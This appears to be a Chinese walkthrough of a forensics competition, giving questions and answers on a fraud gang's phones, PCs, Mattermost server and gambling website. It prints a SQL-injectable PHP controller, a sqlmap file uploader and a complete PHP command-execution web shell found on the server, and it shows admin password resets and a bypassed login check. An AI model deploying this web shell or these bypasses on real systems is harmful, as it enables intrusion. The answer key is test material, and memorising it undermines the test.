>
> 1. 用户恢复出厂设置: 执行恢复出厂设置后, 设备的 AndroidID 通常会重置. 
> 2. 用户刷机: 刷写新的Android系统或固件可能会改变 AndroidID. 
> 3. 设备制造商的设定: 某些设备制造商可能会在设备启动时生成一个新的 AndroidID. 

![](./attachments/image-20240511223926137.png)

该值会存储在`/data/system/user/0/settings_secure.xml`: 

![](./attachments/image-20240511223739485.png)

==9e6c9838dafe7ba0==

#### 02 分析伏季雅的手机检材, 手机型号是

各个厂商的手机型号存储位置不同, 没有标准路径. 

==SM-G996N==

#### 03 分析伏季雅的手机检材, 其和受害人视频通话的时间是

查看手机的 QQ 聊天记录: 

![](./attachments/image-20240511224652412.png)

==2024-04-24-20-46-39==

#### 04 分析伏季雅的手机检材, 手机中安装了一款记账 APP, 该记账 APP 存储记账信息的数据库名称是

在手机安装应用列表中搜索关键词`cost`、`money`、`bill`等关键词: 

![](./attachments/image-20240511231248017.png)

==MoneyLoverS2==

#### 05 接上题, 该记账 APP 登录的邮箱账号是

进入`/data/data/PackageName`路径下查看数据, 该程序的包名为`com.bookmark.money`: 

![](./attachments/image-20240511231545816.png)

翻找数据库, 找到信息: 

![](./attachments/image-20240511231651510.png)

==carleenloydlyis40@gmail.com==

#### 06 接上题, 该记账 APP 中记录的所有收入金额合计是

在上题找到的数据库中, 有标签 `label` 表: 

![](./attachments/image-20240511232218792.png)

同时还有一个表格将标签 `label` 和类别 `category,cat` 标号映射起来: 

![](./attachments/image-20240511232336670.png)

也就是类别与标签相同. 

该数据库有表名 `transactions` 交易表: 

![](./attachments/image-20240511232511069.png)

我们先筛选交易的所有类别: 

![](./attachments/image-20240511232932334.png)

![](./attachments/image-20240511233208772.png)

在这些类别中只有 salary 是收入, 我们对其求和: 

![](./attachments/image-20240511233606668.png)

==279002==

#### 07 接上题, 分析该记账 APP 中的消费记录, 统计从 2022-3-1(含)到 2023-12-1(含)期间, 用于交通的支出费用合计是

![](./attachments/image-20240511234501909.png)

==6042==

#### 08 分析伏季雅的手机检材, 手机中诈骗 APP 的包名是

![](./attachments/output.png)

==w2a.W2Ah5.jsgjzfx.org.cn==

#### 09 分析伏季雅的手机检材, 手机中诈骗 APP 连接的服务器地址是

==192.168.137.125==

#### 10 分析伏季雅的手机检材, 手机中诈骗 APP 的打包 ID 是

==`__W2A__h5.jsgjzfx.org.cn`==

#### 11 分析伏季雅的手机检材, 手机中诈骗 APP 的主启动项是

==io.dcloud.PandoraEntry==

### Windows 计算机

#### 01 分析伏季雅的计算机检材, 计算机最后一次错误登录时间是

![](./attachments/image-20240512003702180.png)

==2024-04-25-09-53-24==

#### 02 分析伏季雅的计算机检材, 计算机中曾经浏览过的电影名字是

![](./attachments/image-20240512003747029.png)

==坠落的审判==

#### 03 分析伏季雅的计算机检材, 计算机中团队内部即时通讯软件的最后一次打开的时间是

![](./attachments/image-20240512003858529.png)

==2024-04-26-17-13-02==

#### 04 分析伏季雅的计算机检材, 计算机中有一款具备虚拟视频功能的软件, 该软件合计播放了多少个视频

![](./attachments/image-20240512004046723.png)

==1==

#### 05 接上题, 该软件的官网地址是

![](./attachments/image-20240512004118800.png)

==`http://www.mvbox.cn `==

#### 06 接上题, 该软件录制数据时, 设置的帧率是

仿真后查看应用设置: 

![](./attachments/image-20240512010403774.png)

==15==

#### 07 分析伏季雅的计算机检材, 在团队内部使用的即时通讯软件中, 其一共接收了多少条虚拟语音

在本地安装一个 mattermost 的客户端并使用火绒剑可以看到 mattermost 在完成初始化之后, 在加载主页面的过程中访问了位于 `%AppData%\Mattermost\Cache\Cache_Data\` 中的数个文件.

![](./attachments/Pasted%20image%2020240518095336.png)

mattermost 使用 Electron 编写, 这些文件为 chrome v8 内核生成的缓存文件. 使用 ChromeCacheView 可以查看本地生成的 Cache 的内容:

![](./attachments/Pasted%20image%2020240518095721.png)

从检材中导出 `%AppData%\Mattermost\Cache\` 目录, 其中存在 2 个子目录 `Cache_Data` 和 `old_Cache_Data_000`. 使用 ChromeCacheView 查看这 2 个子目录, 发现无法获取到缓存的内容. 前者中仅包含 1 条连接记录, 后者文件已经损坏. 至此, 已无法通过计算机检材离线取证 mattermost 的全部缓存, 只能搭建服务器后查看.

正常情况下, 在 ChromeCacheView 中查看所有返回类型为 JSON 的请求的 URL, 可以看到对服务器 API 的调用, 据此可以辨认出每个请求对应的是什么服务.

在本地生成的 Cache 中可以看到消息记录:

![](./attachments/Pasted%20image%2020240518101527.png)

在搭建 IM 服务器之后, 登录 futiya 用户查看.

![](./attachments/Pasted%20image%2020240518102110.png)

如果想找到下载的文件的话, 可以在 Downloads 目录下找到这 4 个语音文件.

==4==

## 毛雪柳的检材

### Android 手机

#### 01 分析毛雪柳的手机检材, 手机中有一个记账 APP, 该 APP 的应用名称是

参见 **04 分析伏季雅的手机检材, 手机中安装了一款记账APP, 该记账APP存储记账信息的数据库名称是**.

==iCost==

### Windows 计算机

#### 01 分析毛雪柳的计算机检材, 计算机首次插入三星固态盘的时间是

存在 3 次接入记录:

![](./attachments/Pasted%20image%2020240518105910.png)

![](./attachments/Pasted%20image%2020240517110932.png)

==2024-04-25 19:08:08==

#### 02 分析毛雪柳的计算机检材, 计算机操作系统当前的 Build 版本是

![](./attachments/Pasted%20image%2020240517111012.png)

==19045.4291==

#### 03 分析毛雪柳的计算机检材, 团队内部使用的即时通讯软件在计算机上存储日志的文件名是

还是 MatterMost, 在 `%APPDATA%\Mattermost\logs` 中可以找到.

![](./attachments/Pasted%20image%2020240517110344.png)

==main.log==

#### 04 分析毛雪柳的计算机检材, 伏季雅一月份实发工资的金额是

在毛雪柳的 Android 手机镜像的相册中可以找到拍摄的 Excel 的加密界面, 其中包含了密码和提示词. 使用该密码可以解密回收站中的 `账本.xlsx` 文件:

![](./attachments/Pasted%20image%2020240517110635.png)

其中可以看到 1 月实发工资为 11200.

==11200==

#### 05 分析毛雪柳的计算机检材, 该团伙三月份的盈余多少

接上题.

==158268==

## 服务器

### IM 服务器

仿真之后将虚拟机的网络连接类型改为 NAT. 由于服务器使用的是 DHCP, 并且开启了 sshd, 可以直接用 shell 连接工具连接.

![](./attachments/Pasted%20image%2020240517203635.png)

可以看到服务器中运行着一个 docker 容器:

![](./attachments/Pasted%20image%2020240517204317.png)

进入容器并且查看作为入口点的脚本 `docker-entry.sh`. 其中包含了 PostgreSQL 和 MatterMost 的配置文件信息:

![](./attachments/Pasted%20image%2020240517204742.png)

PostgreSQL 的配置信息通过环境变量的方式传递, 查看 docker 容器内的环境变量: ^598225

![](./attachments/Pasted%20image%2020240517210300.png)

查看 `/mm/mattermost/config/config-docker.json`, 其中包含的关键信息如下. ^ace485

服务监听端口为 `8065`:

![](./attachments/Pasted%20image%2020240517205337.png)

通过 SqlDriver 连接数据库的配置, 用户名为 `mmuser`, 密码为 `mostest`, 连接数据库为 `mattermost_test`: ^b02a40

![](./attachments/Pasted%20image%2020240517205426.png)

上传文件的保存目录为 `/mm/mattermost-data/`:

![](./attachments/Pasted%20image%2020240517205505.png)

使用浏览器访问 `http://[ip]:8065` 可以访问 MatterMost 的 Web APP.

![](./attachments/Pasted%20image%2020240517210818.png)

用 iptables 可以将容器内 PostgreSQL 使用的 5432 端口映射到虚拟机的 5432 端口, 以便后续使用工具连接:

![](./attachments/Pasted%20image%2020240517211815.png)

使用 pgAdmin 或 Navicat 连接(以下使用 pgAdmin 4.7):

![](./attachments/Pasted%20image%2020240517212056.png)

在数据库的 user 表中可以看到加密存储的密码, 加密类型为 bcrypt.

![](./attachments/Pasted%20image%2020240517213411.png)

生成一个 `bcypt(123456) = $2a$10$szf3PEL.LKhCY3eolO8P7Opra5cr9MJ4aHdQOE5x8T.FW36vFs5/a`, 修改数据库中的密码:

![](./attachments/Pasted%20image%2020240517213551.png)

![](./attachments/Pasted%20image%2020240517213700.png)

随便使用一组用户名密码成功登录.

![](./attachments/Pasted%20image%2020240517213802.png)

#### 01 分析内部 IM 服务器检材, 在搭建的内部即时通讯平台中, 客户端与服务器的通讯端口是

参见上述过程.

==8065==

#### 02 分析内部 IM 服务器检材, 该内部 IM 平台使用的数据库版本是

参见上述过程.

==12.18.1==

#### 03 分析内部 IM 服务器检材, 该内部 IM 平台中数据库的名称是

参见上述过程.

==mattermost_test==

#### 04 分析内部 IM 服务器检材, 该内部 IM 平台中当前数据库一共有多少张表

连接之后查看数据库的表信息.

![](./attachments/Pasted%20image%2020240517213134.png)

==82==

#### 05 分析内部 IM 服务器检材, 员工注册的邀请链接中, 邀请码是

在数据库的 teams 表中可以看到团队信息, 其中的 inviteid 是邀请码.

![](./attachments/Pasted%20image%2020240517214541.png)

在 mattermost 的 web app 中登录管理员用户(gxyt)之后点击左上角的团队名称(wms)也可以看到邀请码:

![](./attachments/Pasted%20image%2020240518001543.png)

==54d916mu6p858bbyz8f88rmbmc==

#### 06 分析内部 IM 服务器检材, 用户 yiyan 一共给 fujiya 发送了几个视频文件

切换到用户 yiyan, 查看与 fujiya 的私信.

![](./attachments/Pasted%20image%2020240518001651.png)

==2==

#### 07 分析内部 IM 服务器检材, 用户 yiyan 在团队群组中发送的视频文件的 MD5 值是

接上题. 存在消息的频道是 Town Square, yiyan 在其中发送了一个视频文件:

![](./attachments/Pasted%20image%2020240518001848.png)

下载之后计算 MD5 即可.

==f8adb03a25be0be1ce39955afc3937f7==

#### 08 分析内部 IM 服务器检材, 一个团队中允许的最大用户数是

登录管理员账号, 在后台可以看到相关设置:

![](./attachments/Pasted%20image%2020240518002434.png)

==50==

#### 09 分析内部 IM 服务器检材, 黑客是什么时候开始攻击

在数据库的 audit 表或者后台的日志中可以看到一个 IP 地址(192.168.127.76)发出了大量的登录尝试, 试图爆破管理员账号的密码:

![](./attachments/Pasted%20image%2020240518002647.png)

第一次尝试登陆的时间戳为 1714030826882, 转换为北京时间:

![](./attachments/Pasted%20image%2020240518003009.png)

==2024-04-25 15:40:26==

### WEB 服务器

仿真之后将虚拟机的网络连接类型改为 NAT. 由于服务器使用的是 DHCP, 并且开启了 sshd, 可以直接用 shell 连接工具连接.

连接之后可以在 `/root` 目录下看到用于备份数据库的 `backup.sh` 和存放备份文件的 `backup` 目录. ^6d8b93

![](./attachments/Pasted%20image%2020240518003406.png)

此外, 还可以看到用于安装宝塔面板的 `install.sh` 脚本.

通过 `bt` 命令, 查看宝塔面板的相关信息并修改用户名和密码:

![](./attachments/Pasted%20image%2020240518003740.png)

![](./attachments/Pasted%20image%2020240518003825.png)

访问 `http://192.168.91.5:39802/39c115ad` 使用修改后的用户信息登录宝塔面板:

![](./attachments/Pasted%20image%2020240518003942.png)

有 1 个数据库:

![](./attachments/Pasted%20image%2020240518004318.png)

有 1 个站点配置:

![](./attachments/Pasted%20image%2020240518004349.png)


#### 01 分析网站服务器检材, 网站搭建使用的服务器管理软件当前版本是否支持 32 位系统

服务器上使用的宝塔版本为 8.0.2, 6.0 及以上版本的宝塔面板均不支持 32 操作系统安装.

==否==

#### 02 分析网站服务器检材, 数据库备份的频率是一周多少次

宝塔面板中的计划任务只有 1 项自带的任务:

![](./attachments/Pasted%20image%2020240518004432.png)

结合上述找到的数据库备份脚本, 猜测使用了 cron 设置了定时任务. 通过 crontab 设置中的定时任务:

![](./attachments/Pasted%20image%2020240518004654.png)

`0 0 * * 0 /root/backup.sh` 表示在每周日的 0:00:00 执行 `/root/backup.sh` 脚本. 因此备份的频率为每周 1 次.

==1==

#### 03 分析网站服务器检材, 数据库备份生成的文件的密码是

`/root/backup.sh` 脚本的内容:

```sh
#!/bin/bash

DB_USER="root"
DB_PASSWORD="root"
DB_NAME="2828"
BACKUP_PATH="/root/backup"

cd $BACKUP_PATH

DATE=$(date +%Y%m%d%H%M%S)

AES_PASS=$(echo -n "$DB_NAME" | openssl enc -aes-256-cbc -a -salt -pass pass:mysecretpassword -nosalt)

BACKUP_FILE_NAME="${DB_NAME}_${DATE}.sql"

mysqldump -u $DB_USER -p$DB_PASSWORD $DB_NAME > $BACKUP_FILE_NAME

File_Name="${DB_NAME}.sql.gz"

tar -czvf - $BACKUP_FILE_NAME | openssl des3 -salt -k $AES_PASS -out $File_Name       

rm -rf  $BACKUP_FILE_NAME

mysqladmin -u $DB_USER -p$DB_PASSWORD drop $DB_NAME --force
```

`AES_PASS=$(echo -n "$DB_NAME" | openssl enc -aes-256-cbc -a -salt -pass pass:mysecretpassword -nosalt)` 为 des3 加密的密钥, 在命令行中运行该指令可以得到密码:

![](./attachments/Pasted%20image%2020240518005613.png)

==`IvPGP/8vfTLtzQfJTmQhYg==`==

#### 04 分析网站服务器检材, 网站前台首页的网站标题是

在宝塔的站点->域名管理中添加虚拟机 NAT 的 IP 地址:

![](./attachments/Pasted%20image%2020240518010449.png)

直接访问 80 端口, 会自动跳转到 google 页面, 在 nginx 的配置文件中没有设置跳转.

查看网站源码 `/www/wwwroot/touzilicai.com/`, 在 `index.php` 中看到了与跳转相关的代码:

```php
if (!in_array($_SERVER['HTTP_HOST'], array('wnsyule.xyz', 'touzilicai.com'))) {       
    header("Location: https://www.google.com/");
    exit();
}
```

将这部分代码删除即可正常访问网站首页:

![](./attachments/Pasted%20image%2020240518010757.png)

网站首页标题为威尼斯.

==威尼斯==

#### 05 分析网站服务器检材, 受害人第一次成功登录网站的时间是

在网站的日志 `/www/wwwlogs/touzilicai.com.log` 中可以看到网站后台的 URL 为 `/Admin/Login/index.php`

![](./attachments/Pasted%20image%2020240518011620.png)

可以进入后台的登陆界面:

![](./attachments/Pasted%20image%2020240518011547.png)

需要在网站的数据库中找到或修改后台的账号密码. 在宝塔的数据库页面找到数据库的管理界面(phpMyAdmin), 尝试使用在备份脚本中获得的用户信息登录, 得到报错:

![](./attachments/Pasted%20image%2020240518011826.png)

该报错是因为数据库未正常启动, 查看日志可以发现是 mysql 的 sock 被占用, 需要手动删除 `/tmp/mysql.sock.lock` 文件. 之后通过命令 `systemctl start mysqld` 启动 mysqld. 

登录 phpMyAdmin 之后发现 2828 库已被删除:

![](./attachments/Pasted%20image%2020240518014351.png)

结合上述找到的加密后的数据库备份文件, 需要从备份中恢复数据库. 通过之前生成的密码对压缩包进行解密:

```shell
openssl des3 -d -salt -k IvPGP/8vfTLtzQfJTmQhYg== -in ./2828.sql.gz -out ./2828_dec.sql.gz
tar -zxvf ./2828_dec.sql.gz 
```

先重新创建一个 2828 库, 再导入备份. 

![](./attachments/Pasted%20image%2020240518014445.png)

由于备份文件的大小超过了 phpMyAdmin 可以的导入文件大小限制(50 MB), 因此需要在命令行中通过指令`mysql -uroot -proot 2828 < ./2828_20240427154000.sql`手动导入. 导入之后的 2828 数据库:

![](./attachments/Pasted%20image%2020240518015007.png)

可以在表 `think_admin` 中看到管理员的账户和加密后的密码. 从站点源码可以看出, 该站点使用 ThinkPHP 搭建, 存储在数据库中的密码为 `md5(pass)`. 手动修改密码后可以登录. (在打算把密码修改成 123456 的时候发现, 原来原本的密码就是 123456.) 

![](./attachments/Pasted%20image%2020240518015310.png)

后台登陆还需要安全码, 登陆相关的源码位于 `/www/wwwroot/touzilicai.com/Application/Admin/Controller/LoginController.class.php` 中. 注释掉其中的

```php
if (I('safeCode') != C('safeCode')) {
    $this->error('安全码错误');
    return false;
    }

```

登录成功之后不能自动跳转, 需要手动访问 `http://[ip]/Admin/Index/index.php` 页面:

![](./attachments/Pasted%20image%2020240518020546.png)

在后台的用户管理界面可以看到名称为"zhiwanjing"的用户, 与受害人姓名拼音一致.

![](./attachments/Pasted%20image%2020240518020642.png)

在用户日志中可以看到, 该用户第一次登录的时间为 2024-04-25 09:49:38.

![](./attachments/Pasted%20image%2020240518021014.png)

==2024-04-25 09:49:38==

#### 06 分析网站服务器检材, 前台页面中, 港澳数字竞猜游戏中, 进入贵宾厅最低点数是

在数据库的 `think_user` 表中随便选择一组密码为 123456 的用户信息登录前台. 前台登录依然无法自动跳转, 需要手动访问 `http://[ip]/Home/Run/index.html`. 之后点击"港澳数字竞猜", 可以看到"贵宾厅"是最后一档房间.

回到网站后台, 查看 游戏房间设置->港澳数字竞猜高级房下注配置, 可以看到最低点数为 100000.

![](./attachments/Pasted%20image%2020240518021545.png)

==100000==

#### 07 分析网站服务器检材, 受害人在平台一共盈利了多少钱

在后台的 输赢统计->客户输赢 中可以看到:

![](./attachments/Pasted%20image%2020240518021902.png)

==2000==

#### 08 分析网站服务器检材, 网站根目录下, 哪个路径存在漏洞

在站点日志的末尾可以看到利用代码:

![](./attachments/Pasted%20image%2020240518022430.png)

日志稍前部分存在大量向 `/Home/User/tkpwdpost.html` 发起的 POST 请求:

![](./attachments/Pasted%20image%2020240518022644.png)

根据该 URL 找到对应的 Controller 类文件为 `/www/wwwroot/touzilicai.com/Application/Home/Controller/UserController.class.php`. 在代码中找到函数 `tkpwdpost` 的定义:

```php
<?php
public function tkpwdpost(){
        if(IS_POST){
            $data=$_POST;
            $id=$data['uid'];
            $res=M('user')->where('id='.$id)->find();
            if(empty($res['tk_password'])){
                if (C('is_weixin') == '1' && is_weixin()) {
                    //保存提现密码
                    $mess=array('tk_password'=>md5($data['pwd']));
                    $pwds=M('user')->where('id='.$id)->save($mess);
                    if($pwds){
                        $this->success('提现密码设置成功,',U('/Home/Run/index'),1);   
                    }else{
                        $this->error('提现密码设置失败');
                    }
                }else{
                    //输入的登录密码MD5加密
                    $pwd=md5($data['loginpwd']);
                    //if($pwd==$res['password']){
                        //判断输入的提现密码是否等于登录密码
//                        if($data['pwd']==$data['loginpwd']){
//                            $this->error('输入的提现密码不能与登录密码一致');       
//                        }
                        //保存提现密码
                        $mess=array('tk_password'=>md5($data['pwd']));
                        $pwds=M('user')->where('id='.$id)->save($mess);
                        if($pwds){
                            $this->success('提现密码设置成功,',U('/Home/Run/index'),1);
                        }
//                    }else{
//                        $this->error('登录密码输入错误');
//                    }
                }
            }else{
                //旧密码
                $pwd=md5($data['loginpwd']);
                if($pwd==$res['tk_password']){
                    //登录密码
                    $logpwd=md5($data['pwd']);
                    if($logpwd==$res['password']){
                        $this->error('提现密码不能与登录密码一致');
                    }
                    $mess=array(
                        'tk_password'=>md5($data['pwd'])
                    );
                    $pwds=M('user')->where('id='.$id)->save($mess);
                    if($pwds){
                        $this->success('提现密码设置成功,',U('/Home/Run/index'),1);   
                    }
                }else{
                    $this->error('旧的提现密码输入错误!');
                }
            }
        }
    }
```

代码中所有涉及到 `id` 参数拼接的部分均存在 SQL 注入风险: `id` 参数直接通过拼接的方式插入到SQL查询中, 没有进行任何形式的转义或参数化. 结合攻击者的大量 POST, 可以判断攻击者使用 SQL 注入的方式进行攻击.

==`/www/wwwroot/touzilicai.com/Application/Home/Controller/UserController.class.php`==

#### 09 分析网站服务器检材, 黑客通过哪个文件上传的木马文件

黑客在对 `/Home/User/tkpwdpost.html` 进行过注入之后, 访问了 `/tmpugklv.php`.

![](./attachments/Pasted%20image%2020240518023931.png)

查看该文件, 文件内容为:

```php
181     ceshi   ceshi   e10adc3949ba59abbe56e057f20f883e        0
/Public/Home/user/image/3.png   1688185121      0       182.121.214.129        1      
0       1       263842.00       0.00    0.00    0       0.00    /Uploads/qrcode/2020-0
9-19/1600487412_1014314374.png  1       0       0
                0       0.00    4297f44b13955235245b2497399d7a93                     
<?php
if (isset($_REQUEST["upload"])){
    $dir=$_REQUEST["uploadDir"];
    if (phpversion()<'4.1.0'){
        $file=$HTTP_POST_FILES["file"]["name"];
        @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();
    }else{
        $file=$_FILES["file"]["name"];
        @move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();
    }
    @chmod($dir."/".$file,0755);
    echo "File uploaded";
}else {
    echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/www/wwwroot/touzilicai.com/> <input type=submit name=upload value=upload></form>";
}
```

可以判断该文件的作用为上传文件.

==`/www/wwwroot/touzilicai.com/tmpugklv.php`==

#### 10 分析网站服务器检材, 网站使用的数据库前缀是

==think==

#### 11 分析网站服务器检材, 木马文件的密码是

黑客在通过 上传木马后访问了 `/tmpbnyhp.php?cmd=echo%20command%20execution%20test`.

![](./attachments/Pasted%20image%2020240518024330.png)

查看该文件内容:

```php
<?
php $c=$_REQUEST["cmd"];
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set("max_execu
tion_time",0);
$z=@ini_get("disable_functions");
if(!empty($z)){
    $z=preg_replace("/[, ]+/",',',$z);
    $z=explode(',',$z);
    $z=array_map("trim",$z);
}else{
    $z=array();
}
$c=$c." 2>&1\n";
function f($n){
    global $z;
    return is_callable($n)and!in_array($n,$z);
}
if(f("system")){
    ob_start();
    system($c);
    $w=ob_get_clean();
}elseif(f("proc_open")){
    $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
    $w=NULL;
    while(!feof($t[1])){
        $w.=fread($t[1],512);
    }
    @proc_close($y);
}elseif(f("shell_exec")){
    $w=shell_exec($c);
}elseif(f("passthru")){
    ob_start();
    passthru($c);
    $w=ob_get_clean();
}elseif(f("popen")){
    $x=popen($c,r);
    $w=NULL;
    if(is_resource($x)){
        while(!feof($x)){
            $w.=fread($x,512);
        }
    }
    @pclose($x);
}elseif(f("exec")){
    $w=array();
    exec($c,$w);
    $w=join(chr(10),$w).chr(10);
}else{
    $w=0;
}
echo "<pre>$w</pre>";
```

可以看出这是一个 web shell, 获取的请求参数为 `cmd`.

==cmd==
